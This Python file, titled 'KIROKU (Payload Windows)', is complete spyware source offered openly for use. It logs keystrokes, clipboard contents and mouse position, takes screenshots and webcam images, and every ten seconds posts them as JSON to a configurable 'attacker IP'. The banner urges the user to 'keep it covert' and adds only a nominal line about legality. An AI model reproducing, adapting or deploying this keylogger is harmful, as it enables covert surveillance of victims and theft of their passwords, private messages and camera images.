"""
   ▄█   ▄█▄  ▄█     ▄████████  ▄██████▄     ▄█   ▄█▄ ███    █▄  
  ███ ▄███▀ ███    ███    ███ ███    ███   ███ ▄███▀ ███    ███ 
  ███▐██▀   ███▌   ███    ███ ███    ███   ███▐██▀   ███    ███ 
 ▄█████▀    ███▌  ▄███▄▄▄▄██▀ ███    ███  ▄█████▀    ███    ███ 
▀▀█████▄    ███▌ ▀▀███▀▀▀▀▀   ███    ███ ▀▀█████▄    ███    ███ 
  ███▐██▄   ███  ▀███████████ ███    ███   ███▐██▄   ███    ███ 
  ███ ▀███▄ ███    ███    ███ ███    ███   ███ ▀███▄ ███    ███ 
  ███   ▀█▀ █▀     ███    ███  ▀██████▀    ███   ▀█▀ ████████▀  (Payload Windows)
  ▀                ███    ███              ▀                    
                                                   A1SBERG
                                                   
Pro Tip: Keep it clean, keep it covert. Always ensure your actions align with legal boundaries and ethical standards. Use responsibly, and stay sharp:>>
"""

from pynput import keyboard, mouse
import requests
import json
import threading
import pyperclip
from PIL import ImageGrab
import io
import base64
import time
import cv2

# Global variables to store captured data
keystrokes = ""  # Buffer to store captured keystrokes
clipboard_data = ""  # Buffer to store clipboard content
previous_clipboard_data = ""  # Buffer to track the previous clipboard content
camera_capture_active = True  # Flag to control camera capture
mouse_position = ""  # Buffer to store the current mouse position

# Configuration settings
server_ip = "127.0.0.1"  # Change this based on your attacker IP
server_port = 8080  # Change this based on your specified port
send_interval = 10  # Interval (in seconds) between sending data
screenshot_interval = 10  # Interval (in seconds) between sending screenshots
image_capture_interval = 10  # Interval (in seconds) between capturing camera images

# Track whether Ctrl, Alt, Shift is pressed
ctrl_pressed = False
alt_pressed = False
shift_pressed = False

def capture_screenshot():
    try:
        # Capture screenshot
        screenshot = ImageGrab.grab()
        buffered = io.BytesIO()
        screenshot.save(buffered, format="PNG")
        screenshot_base64 = base64.b64encode(buffered.getvalue()).decode()
        return screenshot_base64
    except Exception as e:
        print(f"Couldn't capture screenshot: {e}")
        return ""

def capture_camera_image():
    if not camera_capture_active:
        return ""
    try:
        # Open a connection to the webcam (default is camera index 0)
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("Error: Could not open video capture.")
            return ""
        # Capture a single frame
        ret, frame = cap.read()
        cap.release()
        if not ret:
            print("Error: Could not read frame.")
            return ""
        # Save the captured frame to a buffer
        buffered = io.BytesIO()
        _, buffer = cv2.imencode('.png', frame)
        buffered.write(buffer)
        camera_image_base64 = base64.b64encode(buffered.getvalue()).decode()
        return camera_image_base64
    except Exception as e:
        print(f"Couldn't capture camera image: {e}")
        return ""

def send_data():
    global keystrokes, clipboard_data, camera_capture_active, mouse_position
    last_screenshot_time = time.time()
    last_image_capture_time = time.time()
    while True:
        try:
            current_time = time.time()
            screenshot_base64 = ""
            if current_time - last_screenshot_time >= screenshot_interval:
                screenshot_base64 = capture_screenshot()
                last_screenshot_time = current_time
            camera_image_base64 = ""
            if current_time - last_image_capture_time >= image_capture_interval:
                camera_image_base64 = capture_camera_image()
                last_image_capture_time = current_time
            # Prepare the payload with mouse position
            payload_data = {
                "keyboardData": keystrokes,
                "screenshot": screenshot_base64,
                "clipboardData": clipboard_data,
                "cameraImage": camera_image_base64,
                "mousePosition": mouse_position
            }
            # Create payload in JSON format
            payload = json.dumps(payload_data)
            # Send POST request to the server with the keystrokes, clipboard data, and screenshot
            r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})
            # Clear the buffer after successful send
            keystrokes = ""
            clipboard_data = ""
            mouse_position = ""  # Clear mouse position after sending
            # If we successfully sent data, camera capture is active
            camera_capture_active = True
        except requests.ConnectionError as e:
            print(f"Couldn't complete request: {e}")
            camera_capture_active = False
        except Exception as e:
            print(f"Couldn't complete request: {e}")
        # Wait for the specified interval before sending again
        time.sleep(send_interval)

def handle_keystrokes(key):
    global keystrokes, ctrl_pressed, alt_pressed, shift_pressed
    try:
        if key == keyboard.Key.enter:
            keystrokes += "\n"
        elif key == keyboard.Key.tab:
            keystrokes += "\t"
        elif key == keyboard.Key.space:
            keystrokes += " "
        elif key == keyboard.Key.backspace:
            if len(keystrokes) > 0:
                keystrokes = keystrokes[:-1]
        elif key == keyboard.Key.esc:
            return False
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            ctrl_pressed = True
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            alt_pressed = True
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r or key == keyboard.Key.shift:
            shift_pressed = True
        elif key == keyboard.Key.cmd:
            return
        elif key == keyboard.Key.print_screen or (ctrl_pressed and shift_pressed and key == keyboard.Key.s):
            return
        else:
            if not (ctrl_pressed or alt_pressed):
                keystrokes += str(key).strip("'")
    except Exception as e:
        print(f"Error processing key: {e}")

def on_release(key):
    global ctrl_pressed, alt_pressed, shift_pressed
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        ctrl_pressed = False
    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        alt_pressed = False
    elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
        shift_pressed = False

def monitor_clipboard():
    global clipboard_data, previous_clipboard_data
    while True:
        try:
            current_clipboard_data = pyperclip.paste()  # Capture current clipboard content
            if current_clipboard_data != previous_clipboard_data and current_clipboard_data.strip() != "":
                previous_clipboard_data = current_clipboard_data
                clipboard_data = current_clipboard_data
        except Exception as e:
            print(f"Failed to read clipboard data: {e}")
        time.sleep(1)  # Polling interval (Change if needed)

def on_move(x, y):
    global mouse_position
    mouse_position = f"({x}, {y})"  # Update global variable with mouse position

if __name__ == "__main__":
    # Start the mouse listener
    mouse_listener = mouse.Listener(on_move=on_move)
    mouse_listener.start()
    # Start the data sending thread
    data_thread = threading.Thread(target=send_data, daemon=True)
    data_thread.start()
    # Start the clipboard monitoring thread
    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    clipboard_thread.start()
    # Start the key listener
    with keyboard.Listener(on_press=handle_keystrokes, on_release=on_release) as listener:
        listener.join()
